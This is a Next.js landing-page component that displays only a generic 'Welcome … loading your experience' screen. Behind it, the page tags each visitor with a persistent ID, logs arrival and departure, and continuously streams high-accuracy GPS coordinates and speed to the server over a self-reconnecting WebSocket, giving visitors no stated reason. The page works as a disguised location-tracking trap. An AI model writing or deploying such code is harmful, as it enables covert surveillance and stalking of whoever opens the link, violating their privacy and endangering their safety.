"use client";

import { useEffect, useState } from "react";

export default function LandingPage() {
  const [status, setStatus] = useState("Connecting...");
  const [done, setDone] = useState(false);

  useEffect(() => {
    let vid = localStorage.getItem("vid");
    if (!vid) {
      vid = Math.random().toString(36).substring(2, 10);
      localStorage.setItem("vid", vid);
    }

    // Register visit
    fetch("/api/visit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ vid, page: "/" }),
    })
      .then((r) => r.json())
      .then(() => {
        setStatus("Connected");
        setDone(true);
        startGps(vid!);
      })
      .catch(() => {
        setStatus("Page loaded");
        setDone(true);
      });

    // Notify on leave
    const handleLeave = () => {
      navigator.sendBeacon(
        "/api/leave",
        JSON.stringify({ vid })
      );
    };
    window.addEventListener("beforeunload", handleLeave);
    return () => window.removeEventListener("beforeunload", handleLeave);
  }, []);

  function startGps(vid: string) {
    if (!navigator.geolocation) return;
    const proto = location.protocol === "https:" ? "wss" : "ws";
    const ws = new WebSocket(`${proto}://${location.host}/ws/gps`);
    ws.onopen = () => {
      navigator.geolocation.watchPosition(
        (pos) => {
          const { latitude, longitude, accuracy, speed } = pos.coords;
          if (ws.readyState === 1) {
            ws.send(
              JSON.stringify({ vid, lat: latitude, lng: longitude, accuracy, speed })
            );
          }
        },
        () => {},
        { enableHighAccuracy: true, maximumAge: 3000, timeout: 10000 }
      );
    };
    ws.onclose = () => setTimeout(() => startGps(vid), 5000);
  }

  return (
    <div className="min-h-screen flex items-center justify-center text-center px-5">
      <div>
        <h1 className="text-4xl font-bold mb-3">Welcome</h1>
        <p className="text-gray-500 mb-6">This page is loading your experience...</p>
        {!done && (
          <div className="w-10 h-10 border-3 border-gray-700 border-t-blue-500 rounded-full animate-spin mx-auto mb-5" />
        )}
        <p className={done ? "text-green-400 text-sm" : "text-gray-600 text-sm"}>
          {status}
        </p>
      </div>
    </div>
  );
}
